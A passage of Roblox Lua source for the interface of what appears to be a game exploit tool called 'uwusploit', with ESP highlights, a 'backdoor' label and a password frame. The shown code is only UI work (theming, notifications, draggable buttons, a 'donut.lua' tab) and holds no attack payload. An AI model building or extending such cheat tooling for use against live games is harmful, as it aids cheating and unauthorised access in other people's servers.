				object.TextColor3 = uwu["default text color"]
			end
		else
			if txtlength > 0 then
				object.TextColor3 = uwu["default text color"]
			else
				object.TextColor3 = uwu["default 1/2 color"]
			end
		end
	end

	if object:IsA("ScrollingFrame") then
		object.ScrollBarImageColor3 = uwu["default 1/2 color"]
	end

	if object:IsA("ImageLabel") and object.Image == "rbxassetid://110126477790022" then
		object.ImageColor3 = uwu["default text color"]
	end

	if object:IsA("Highlight") and object.Name == "unableesp" then		
		if noxioustheme then 
			object.FillColor = uwu["default background color"]
		else
			object.FillColor = uwu["default border color"]
		end
		object.OutlineColor = Color3.new(1, 1, 1)
	end

	if object:IsA("BillboardGui") and object.Name == "unableesp" then
		local label = object:FindFirstChildOfClass("TextLabel")
		if label then
			if noxioustheme then
				label.TextColor3 = uwu["default background color"]
			else
				label.TextColor3 = uwu["default border color"]
			end
		end
	end
end

function updcols()
	applycurrenttheme()

	if uwu["screen gui"] then
		for _, object in pairs(uwu["screen gui"]:GetDescendants()) do
			applycols(object)
		end
	end

	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("Highlight") or (descendant:IsA("BillboardGui") and descendant.Name == "unableesp") then
			applycols(descendant)
		end
	end
end

spawn(updcols)

-------------------------------------------------------------------------------------------------------------------------------

function repos(ui, t, w, h)
	if not t then t = 0.5 end

	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y

	local frameWidth = w
	local frameHeight = h
	local negative = 56

	if ui ~= uwu["top bar"] then negative = 42 end

	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - negative
	local tweenInfo = TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)

	local tween = game:GetService("TweenService"):Create(
		ui,
		tweenInfo,
		{Position = UDim2.new(0, centerX, 0, centerY)}
	)

	tween:Play()
end

-------------------------------------------------------------------------------------------------------------------------------

uwu["wm"].Name = "backdoor"
uwu["wm"].Parent = uwu["screen gui"]
uwu["wm"].Text = ""
uwu["wm"].TextColor3 = uwu["default border color"]
uwu["wm"].TextStrokeColor3 = uwu["default background color"]
uwu["wm"].TextStrokeTransparency = 0
uwu["wm"].BackgroundTransparency = 1
uwu["wm"].Font = uwu["default text font"]
uwu["wm"].TextSize = 17
uwu["wm"].TextXAlignment = Enum.TextXAlignment.Center
uwu["wm"].TextYAlignment = Enum.TextYAlignment.Center
uwu["wm"].Size = UDim2.new(0, 200, 0, 30)
uwu["wm"].ZIndex = 100000
uwu["wm"].Visible = false

local notificationZ = 100000
local activeNotifications = {}
local pendingNotifications = {}
local isNotifying = false

local typingSounds = {
	"rbxassetid://9120299506", "rbxassetid://9120299323", "rbxassetid://9120300060",
	"rbxassetid://9120299407", "rbxassetid://9120299677", "rbxassetid://9120299595",
	"rbxassetid://9120299319", "rbxassetid://9120299508", "rbxassetid://9120299839",
	"rbxassetid://9120299810", "rbxassetid://9120299893", "rbxassetid://9120299710",
}

function playSound(soundId)
	local s = Instance.new("Sound")
	s.SoundId = soundId
	s.Volume = 1
	s.Parent = uwu["local player"]
	s:Play()
	game:GetService("Debris"):AddItem(s, 3)
end

function updateNotificationPositions()
	local baseY = -50
	local spacing = 17

	for i, notif in ipairs(activeNotifications) do
		local targetY = baseY + (i - 1) * spacing
		local tween = game:GetService("TweenService"):Create(notif, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Position = UDim2.new(0.5, -100, 0, targetY)
		})
		tween:Play()
	end
end

function processNextNotification()
	if #pendingNotifications == 0 then
		isNotifying = false
		return
	end

	isNotifying = true
	local text = table.remove(pendingNotifications, 1)

	local camera = workspace.CurrentCamera
	local screenWidth = camera.ViewportSize.X
	local screenHeight = camera.ViewportSize.Y

	local startX = (screenWidth - 200) / 2
	local startY = -110

	local label = uwu["wm"]:Clone()
	label.Text = "[ ]"
	label.ZIndex = notificationZ
	notificationZ += 1
	label.Position = UDim2.new(0, startX, 0, startY)
	label.Parent = uwu["screen gui"]

	playSound("rbxassetid://15675028888")

	table.insert(activeNotifications, label)
	updateNotificationPositions()

	t(0.3)

	task.spawn(function()
		for i = 1, #text do
			label.Text = "[ " .. text:sub(1, i) .. " ]"

			local typeSound = Instance.new("Sound")
			typeSound.SoundId = typingSounds[math.random(1, #typingSounds)]
			typeSound.Volume = 0.6
			typeSound.Name = "canttouchthis"
			typeSound.Parent = uwu["local player"]
			typeSound:Play()
			game:GetService("Debris"):AddItem(typeSound, 2)

			t(0.03)
		end
	end)

	local typingTime = #text * 0.03
	local holdTime = 1.2
	local totalDuration = typingTime + holdTime

	task.delay(totalDuration + 1.5, function()
		local tweenOut = game:GetService("TweenService"):Create(label, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
			Position = UDim2.new(0.5, -100, 0, -80)
		})
		tweenOut:Play()

		playSound("rbxassetid://15675028888")
		tweenOut.Completed:Wait()

		label:Destroy()
		for i = #activeNotifications, 1, -1 do
			if activeNotifications[i] == label then
				table.remove(activeNotifications, i)
				break
			end
		end

		updateNotificationPositions()
	end)

	task.delay(0.4, processNextNotification)
end

function unablenotify(text)
	if not uwu["wm"] then return end
	uwu["wm"].Visible = true
	table.insert(pendingNotifications, text)
	if not isNotifying then
		processNextNotification()
	end
end

-------------------------------------------------------------------------------------------------------------------------------

uwu["click sound"] = Instance.new"Sound"
uwu["click sound"].SoundId = "rbxassetid://226892749"
uwu["click sound"].Parent = uwu["local player"]
uwu["click sound"].Name = "canttouchthis"
uwu["click sound"].Volume = 0.4

uwu["startup"] = Instance.new"Sound"
uwu["startup"].SoundId = "rbxassetid://8503529653"
uwu["startup"].Parent = uwu["local player"]
uwu["startup"].Volume = 0
uwu["startup"].TimePosition = 0

function playclicksound()
	local newSound = uwu["click sound"]:Clone()
	newSound.Parent = uwu["click sound"].Parent
	newSound:Play()
	newSound.Ended:Connect(function() newSound:Destroy() end)
end

uwu["startup"]:Play()
uwu["startup"]:Stop()
t(0.1)
uwu["startup"].Volume = 3.5

-------------------------------------------------------------------------------------------------------------------------------

uwu["toggle interface visibility button"].Size = UDim2.new(0, 48, 0, 48)
uwu["toggle interface visibility button"].Position = UDim2.new(0, 0, 10, 0)

uwu["toggle interface visibility button"].BackgroundColor3 = uwu["default background color"]

uwu["toggle interface visibility button"].BorderColor3 = uwu["default border color"]
uwu["toggle interface visibility button"].BorderSizePixel = 1

uwu["toggle interface visibility button"].TextColor3 = uwu["default border color"]
uwu["toggle interface visibility button"].Font = Enum.Font.RobotoMono
uwu["toggle interface visibility button"].TextSize = 20
uwu["toggle interface visibility button"].TextScaled = false
uwu["toggle interface visibility button"].Text = ">.<"
uwu["toggle interface visibility button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["toggle interface visibility button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["toggle interface visibility button text padding"] = Instance.new("UIPadding")
uwu["toggle interface visibility button text padding"].PaddingTop = UDim.new(0, -3)
uwu["toggle interface visibility button text padding"].Parent = uwu["toggle interface visibility button"]

uwu["toggle interface visibility button"].Parent = uwu["screen gui"]
uwu["toggle interface visibility button"].ZIndex = 6969

-------------------------------------------------------------------------------------------------------------------------------

function movebutton()
	updcols()
	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X

	local buttonWidth = 48

	local centerX = (screenWidth - buttonWidth) / 2
	local topMargin = 20
	local centerY = topMargin

	uwu["toggle interface visibility button"].Position = UDim2.new(0, centerX, 0, centerY - 150)

	local offsetY = 150
	local targetPosition = UDim2.new(0, centerX, 0, centerY - offsetY)

	local tweenInfoUp = TweenInfo.new(0, Enum.EasingStyle.Back, Enum.EasingDirection.Out, 0, false, 0)

	local tweenUp = uwu["tween service"]:Create(uwu["toggle interface visibility button"], tweenInfoUp, {Position = targetPosition})

	local function moveButtonBack()
		local tweenInfoDown = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

		local tweenDown = uwu["tween service"]:Create(uwu["toggle interface visibility button"], tweenInfoDown, {Position = UDim2.new(0, centerX, 0, centerY)})

		tweenDown:Play()
	end

	uwu["toggle interface visibility button"].Visible = true
	tweenUp:Play()
	spawn(function() uwu["startup"]:Play() end)

	tweenUp.Completed:Wait()
	moveButtonBack()
end

function dragbutton()
	task.spawn(function()
		local frame = uwu["toggle interface visibility button"]
		local dragger = uwu["toggle interface visibility button"]
		
		if uwu["is mobile?"] then
			local dragspeed = 0.15
			local dragstart
			local startpos
			local dragginginput

			local function updatebuttoninput(input)
				if btnundraggable then return end
				if input ~= dragginginput then return end
				local delta = input.Position - dragstart
				local newpos = UDim2.new(
					startpos.X.Scale,
					startpos.X.Offset + delta.X,
					startpos.Y.Scale,
					startpos.Y.Offset + delta.Y
				)
				uwu["tween service"]:Create(frame, TweenInfo.new(dragspeed), {Position = newpos}):Play()
			end

			local dragthreshold = 15
			local buttondragtgl = false
			local draggingui = false

			dragger.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					if dragginginput then return end
					buttondragtgl = true
					draggingui = false
					dragged = false
					dragstart = input.Position
					startpos = frame.Position
					dragginginput = input

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							buttondragtgl = false
							dragginginput = nil
						end
					end)
				end
			end)

			uwu["user input service"].InputChanged:Connect(function(input)
				if dragginginput and input == dragginginput and buttondragtgl then
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						local delta = input.Position - dragstart
						if not draggingui then
							if math.abs(delta.X) > dragthreshold or math.abs(delta.Y) > dragthreshold then
								dragged = true
								draggingui = true
							end
						end
						if draggingui then
							updatebuttoninput(input)
						end
					end
				end
			end)
		else
			task.spawn(function()
				local dragSpeed = 0.15
				local dragStart
				local startPos

				local function updatebuttoninput(input)
					if btnundraggable then return end
					local delta = input.Position - dragStart
					local newPos = UDim2.new(
						startPos.X.Scale,
						startPos.X.Offset + delta.X,
						startPos.Y.Scale,
						startPos.Y.Offset + delta.Y
					)
					uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = newPos}):Play()
				end

				local dragThreshold = 15

				dragger.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						buttondragtgl = true
						draggingui = false
						dragStart = input.Position
						startPos = frame.Position

						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								buttondragtgl = false
							end
						end)
					end
				end)

				uwu["user input service"].InputChanged:Connect(function(input)
					if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and buttondragtgl then
						local delta = input.Position - dragStart
						if not draggingui then
							if math.abs(delta.X) > dragThreshold or math.abs(delta.Y) > dragThreshold then
								draggingui = true
							end
						end
						if draggingui then
							updatebuttoninput(input)
						end
					end
				end)
			end)
		end
	end)
end

dragbutton()

-------------------------------------------------------------------------------------------------------------------------------

local minimized = false
local canpress = true
local lastVisibleFrame = "main frame 1"
local canpress2 = true

local rotationCycle = {
	["small button top"] = "small button right",
	["small button right"] = "small button bottom",
	["small button bottom"] = "small button left",
	["small button left"] = "small button top"
}

local counterRotationCycle = {
	["small button top"] = "small button left",
	["small button left"] = "small button bottom", 
	["small button bottom"] = "small button right",
	["small button right"] = "small button top"
}

local buttonConfigs = {
	["small button left"] = {
		text = "/]",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if uwu["unlocked"] == true then
					uwu["password frame"].Visible = false
				else
					uwu["password frame"].Visible = true
				end
				uwu["main frame 1"].Visible = false
				uwu["main frame 2"].Visible = false
				uwu["main frame 3"].Visible = false
				uwu["main frame 4"].Visible = true
				lastVisibleFrame = "main frame 4"
			end
		end
	},
	["small button right"] = {
		text = "(i)",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if uwu["unlocked"] == true then
					uwu["password frame"].Visible = false
				else
					uwu["password frame"].Visible = true
				end
				uwu["main frame 1"].Visible = false
				uwu["main frame 2"].Visible = true
				uwu["main frame 3"].Visible = false
				uwu["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 2"
			end
		end
	},
	["small button top"] = {
		text = ">_",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if uwu["unlocked"] == true then
					uwu["password frame"].Visible = false
				else
					uwu["password frame"].Visible = true
				end
				uwu["main frame 1"].Visible = true
				uwu["main frame 2"].Visible = false
				uwu["main frame 3"].Visible = false
				uwu["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 1"
			end
		end
	},
	["small button bottom"] = {
		text = "<+>",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if uwu["unlocked"] == true then
					uwu["password frame"].Visible = false
				else
					uwu["password frame"].Visible = true
				end
				uwu["main frame 1"].Visible = false
				uwu["main frame 2"].Visible = false
				uwu["main frame 3"].Visible = true
				uwu["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 3"
			end
		end
	}
}

local originalPositions = {}

local randomRotations = {}

function getRandomRotation()
	return math.random(180, 180)
end

for name, config in pairs(buttonConfigs) do
	uwu[name] = Instance.new("TextButton")
	local smallButton = uwu[name]
	smallButton.Size = UDim2.new(0, 30, 0, 30)
	smallButton.Position = UDim2.new(0.5, -15, 0.5, -15)
	smallButton.BackgroundColor3 = uwu["default background color"]
	smallButton.BorderColor3 = uwu["default border color"]
	smallButton.BorderSizePixel = 1
	smallButton.Text = config.text
	smallButton.TextColor3 = uwu["default border color"]
	smallButton.Font = Enum.Font.RobotoMono
	smallButton.TextSize = 16
	smallButton.TextScaled = false
	smallButton.TextXAlignment = Enum.TextXAlignment.Center
	smallButton.TextYAlignment = Enum.TextYAlignment.Center
	smallButton.ZIndex = 6968
	smallButton.Parent = uwu["toggle interface visibility button"]
	smallButton.Visible = false

	originalPositions[name] = smallButton.Position

	randomRotations[name] = getRandomRotation()
	smallButton.Rotation = randomRotations[name]

	smallButton.MouseButton1Click:Connect(function()
		config.onClick()
	end)
end

function tweenPositionAndRotation(object, targetPosition, targetRotation, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = uwu["tween service"]:Create(object, tweenInfo, {Position = targetPosition, Rotation = targetRotation})
	tween:Play()
	return tween
end

local initialOffsets = {
	["small button left"] = UDim2.new(0, -10, 0, 0),
	["small button right"] = UDim2.new(0, 10, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, -10),
	["small button bottom"] = UDim2.new(0, 0, 0, 10)
}

local showOffsets = {
	["small button left"] = UDim2.new(0, -50, 0, 0),
	["small button right"] = UDim2.new(0, 50, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, -50),
	["small button bottom"] = UDim2.new(0, 0, 0, 50)
}

local hideOffsets = {
	["small button left"] = UDim2.new(0, 50, 0, 0),
	["small button right"] = UDim2.new(0, -50, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, 50),
	["small button bottom"] = UDim2.new(0, 0, 0, -50)
}

uwu["toggle interface visibility button"].MouseButton1Click:Connect(function()

	if not canpress then return end
	if not canpress2 then return end
	playclicksound()

	toggleLoop(false)
	local topBar = uwu["top bar"]
	local blockAll = uwu["block all"]

	if topBar.Visible == false then
		canpress = false
		canpress2 = false

		blockAll.Parent = uwu["screen gui"]
		blockAll.Position = topBar.Position
		blockAll.Size = UDim2.new(0, 401, 0, 0)
		blockAll.BackgroundColor3 = uwu["default background color"]
		blockAll.BorderColor3 = uwu["default border color"]
		blockAll.BorderSizePixel = 1
		blockAll.ZIndex = 58
		blockAll.Visible = true
		blockAll.BackgroundTransparency = 0

		spawn(function()
			if minimized == true then
				expandTween = uwu["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
					Size = UDim2.new(0, 401, 0, 26)
				})
			else
				expandTween = uwu["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
					Size = UDim2.new(0, 401, 0, 276)
				})
			end
			expandTween:Play()
			expandTween.Completed:Wait()

			topBar.Visible = true

			fadeTween = uwu["tween service"]:Create(blockAll, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				BackgroundTransparency = 1
			})
			fadeTween:Play()
			fadeTween.Completed:Wait()

			blockAll.Visible = false
			if scanning == false then
				uwu["toggle interface visibility button"].Text = ">.<"
				toggleLoop(true)
			end
			canpress = true
			canpress2 = true
		end)

		spawn(function()
			if not uwu["unlocked"] then return end
			if minimized then return end
			local tweens = {}
			for name, offset in pairs(showOffsets) do
				local smallButton = uwu[name]
				smallButton.Visible = true
				local targetPosition = originalPositions[name] + offset
				local targetRotation = 0
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)
	else
		canpress = false
		canpress2 = false

		spawn(function()
			blockAll.Parent = uwu["screen gui"]
			blockAll.Position = topBar.Position
			if minimized == true then
				blockAll.Size = UDim2.new(0, 401, 0, 26)
			else
				blockAll.Size = UDim2.new(0, 401, 0, 276)
			end
			blockAll.BackgroundTransparency = 1
			blockAll.Visible = true

			local fadeInTween = uwu["tween service"]:Create(blockAll, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				BackgroundTransparency = 0
			})
			fadeInTween:Play()
			fadeInTween.Completed:Wait()

			topBar.Visible = false

			local shrinkTween = uwu["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				Size = UDim2.new(0, 401, 0, 0)
			})
			shrinkTween:Play()
			shrinkTween.Completed:Wait()

			blockAll.Visible = false
			canpress = true
			canpress2 = true
			if scanning == false then
				uwu["toggle interface visibility button"].Text = "o.o"
				toggleLoop(true)
			end
		end)

		spawn(function()
			if not uwu["unlocked"] then return end
			if minimized then return end
			for name, _ in pairs(showOffsets) do
				randomRotations[name] = getRandomRotation()
			end

			local tweens = {}
			for name, _ in pairs(showOffsets) do
				local smallButton = uwu[name]
				local targetPosition = originalPositions[name]
				local targetRotation = randomRotations[name]
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				tween.Completed:Connect(function()
					smallButton.Visible = false
				end)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)
	end
end)

uwu["block all"]:GetPropertyChangedSignal("Visible"):Connect(function()
	if uwu["block all"].Visible then
		uwu["block all"].Position = uwu["top bar"].Position
	end
end)

function rotateButtons(direction)
	if not canpress2 then return end
	if not uwu["top bar"].Visible then return end

	function tweenPositionAndRotation(object, targetPosition, targetRotation, duration)
		local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = uwu["tween service"]:Create(object, tweenInfo, {Position = targetPosition, Rotation = targetRotation})
		tween:Play()
		return tween
	end

	canpress2 = false

	local cycle = (direction == "counter") and counterRotationCycle or rotationCycle

	local targetPositions = {}
	for name, targetName in pairs(cycle) do
		targetPositions[name] = originalPositions[targetName] + showOffsets[targetName]
	end

	local tweens = {}
	for name, targetName in pairs(cycle) do
		local button = uwu[name]
		local tween = tweenPositionAndRotation(button, targetPositions[name], 0, 0.5)
		table.insert(tweens, tween)
	end

	local newOriginalPositions = {}
	local newShowOffsets = {}
	for name, targetName in pairs(cycle) do
		newOriginalPositions[name] = originalPositions[targetName]
		newShowOffsets[name] = showOffsets[targetName]
	end

	originalPositions = newOriginalPositions
	showOffsets = newShowOffsets

	canpress2 = true

	for _, tween in ipairs(tweens) do
		tween.Completed:Wait()
	end
end

uwu["user input service"].InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.RightBracket then
			if uwu["toggle interface visibility button"].Text == ">.<" then return end
			if canpress == false then return end
			coroutine.wrap(rotateButtons)("clockwise")
		elseif input.KeyCode == Enum.KeyCode.LeftBracket then
			if uwu["toggle interface visibility button"].Text == ">.<" then return end
			if canpress == false then return end
			coroutine.wrap(rotateButtons)("counter")
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["top bar"].Size = UDim2.new(0, 401, 0, 26)

uwu["top bar"].BackgroundColor3 = uwu["default background color"]

uwu["top bar"].BorderColor3 = uwu["default border color"]
uwu["top bar"].BorderSizePixel = 1

uwu["top bar"].TextColor3 = uwu["default border color"]
uwu["top bar"].Font = Enum.Font.RobotoMono
uwu["top bar"].TextSize = 15
uwu["top bar"].TextScaled = false
uwu["top bar"].Text = " [v" .. uwu["version"] .. "] uwusploit " .. uwu["emoticon"]
uwu["top bar"].TextXAlignment = Enum.TextXAlignment.Left
uwu["top bar"].TextYAlignment = Enum.TextYAlignment.Center

uwu["top bar text padding"] = Instance.new("UIPadding")
uwu["top bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["top bar text padding"].PaddingRight = UDim.new(0, 0)
uwu["top bar text padding"].Parent = uwu["top bar"]

uwu["top bar"].Parent = uwu["screen gui"]
uwu["top bar"].ZIndex = 19
uwu["top bar"].Visible = false

function dragtopbar()
	local frame = uwu["top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	uwu["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragtopbar()

-------------------------------------------------------------------------------------------------------------------------------

uwu["donut tab top bar"].Size = UDim2.new(0, 276, 0, 26)

uwu["donut tab top bar"].BackgroundColor3 = uwu["default background color"]

uwu["donut tab top bar"].BorderColor3 = uwu["default border color"]
uwu["donut tab top bar"].BorderSizePixel = 1

uwu["donut tab top bar"].TextColor3 = uwu["default border color"]
uwu["donut tab top bar"].Font = Enum.Font.RobotoMono
uwu["donut tab top bar"].TextSize = 15
uwu["donut tab top bar"].TextScaled = false
uwu["donut tab top bar"].Text = " donut.lua o.o"
uwu["donut tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
uwu["donut tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

uwu["donut top bar text padding"] = Instance.new("UIPadding")
uwu["donut top bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["donut top bar text padding"].PaddingRight = UDim.new(0, 0)
uwu["donut top bar text padding"].Parent = uwu["donut tab top bar"]

uwu["donut tab top bar"].Parent = uwu["screen gui"]
uwu["donut tab top bar"].ZIndex = 110
uwu["donut tab top bar"].Visible = false

function dragdonuttabtopbar()
	local frame = uwu["donut tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	uwu["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragdonuttabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

uwu["donut tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
uwu["donut tab top bar close button"].Position = UDim2.new(0, 254, 0, 4.7)

uwu["donut tab top bar close button"].BackgroundColor3 = uwu["default background color"]

uwu["donut tab top bar close button"].BorderColor3 = uwu["default border color"]
uwu["donut tab top bar close button"].BorderSizePixel = 1

uwu["donut tab top bar close button"].TextColor3 = uwu["default border color"]
uwu["donut tab top bar close button"].Font = Enum.Font.RobotoMono
uwu["donut tab top bar close button"].TextSize = 16
uwu["donut tab top bar close button"].TextScaled = false
uwu["donut tab top bar close button"].Text = "X"
uwu["donut tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["donut tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["donut tab top bar close button"].Parent = uwu["donut tab top bar"]
uwu["donut tab top bar close button"].ZIndex = 111

uwu["donut tab top bar close button text padding"] = Instance.new("UIPadding")
uwu["donut tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
uwu["donut tab top bar close button text padding"].Parent = uwu["donut tab top bar close button"]

uwu["donut tab top bar close button"].MouseButton1Click:Connect(function()
	if not donuttabcanminimize then return end
	if donutrunning then
		donutrunning:Disconnect()
		donutrunning = nil
	end
	donuttabopen = false
	donuttabminimized = false
	playclicksound()
	uwu["donut tab top bar"].Visible = false
	repos(uwu["donut tab top bar"], 0, 276, 260 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["donut tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
uwu["donut tab top bar minimize button"].Position = UDim2.new(0, 230, 0, 4.7)

uwu["donut tab top bar minimize button"].BackgroundColor3 = uwu["default background color"]

uwu["donut tab top bar minimize button"].BorderColor3 = uwu["default border color"]
uwu["donut tab top bar minimize button"].BorderSizePixel = 1

uwu["donut tab top bar minimize button"].TextColor3 = uwu["default border color"]
uwu["donut tab top bar minimize button"].Font = Enum.Font.RobotoMono
uwu["donut tab top bar minimize button"].TextSize = 16
uwu["donut tab top bar minimize button"].TextScaled = false
uwu["donut tab top bar minimize button"].Visible = true
uwu["donut tab top bar minimize button"].Text = "-"
uwu["donut tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["donut tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["donut tab top bar minimize button"].Parent = uwu["donut tab top bar"]
uwu["donut tab top bar minimize button"].ZIndex = 111

uwu["donut tab top bar minimize button text padding"] = Instance.new("UIPadding")
uwu["donut tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
uwu["donut tab top bar minimize button text padding"].Parent = uwu["donut tab top bar minimize button"]

donuttabminimized = false
donuttabcanminimize = true

uwu["donut tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not donuttabcanminimize then return end
	spawn(playclicksound)
	donuttabcanminimize = false

	donuttabminimized = not donuttabminimized

	if donuttabminimized then
		uwu["donut tab top bar minimize button"].Text = "+"
		uwu["donut tab block main frame"].Visible = true

		local fadeTween = fade(uwu["donut tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		uwu["donut tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			uwu["donut tab block main frame"],
			UDim2.new(0, 276, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		donuttabreallyminimized = true
		uwu["donut tab block main frame"].Visible = false
	else
		uwu["donut tab top bar minimize button"].Text = "-"
		uwu["donut tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			uwu["donut tab block main frame"],
			UDim2.new(0, 276, 0, 233),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		uwu["donut tab main frame 1"].Visible = true

		local fadeTween = fade(uwu["donut tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		donuttabreallyminimized = false
		uwu["donut tab block main frame"].Visible = false
	end

	donuttabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["donut tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
uwu["donut tab top bar reposition button"].Position = UDim2.new(0, 206, 0, 4.7)

uwu["donut tab top bar reposition button"].BackgroundColor3 = uwu["default background color"]

uwu["donut tab top bar reposition button"].BorderColor3 = uwu["default border color"]
uwu["donut tab top bar reposition button"].BorderSizePixel = 1

uwu["donut tab top bar reposition button"].TextColor3 = uwu["default border color"]
uwu["donut tab top bar reposition button"].Font = Enum.Font.RobotoMono
uwu["donut tab top bar reposition button"].TextSize = 16
uwu["donut tab top bar reposition button"].TextScaled = false
uwu["donut tab top bar reposition button"].Text = "R"
uwu["donut tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["donut tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["donut tab top bar reposition button"].Parent = uwu["donut tab top bar"]
uwu["donut tab top bar reposition button"].ZIndex = 111

uwu["donut tab top bar reposition button text padding"] = Instance.new("UIPadding")
uwu["donut tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
uwu["donut tab top bar reposition button text padding"].Parent = uwu["donut tab top bar reposition button"]

uwu["donut tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
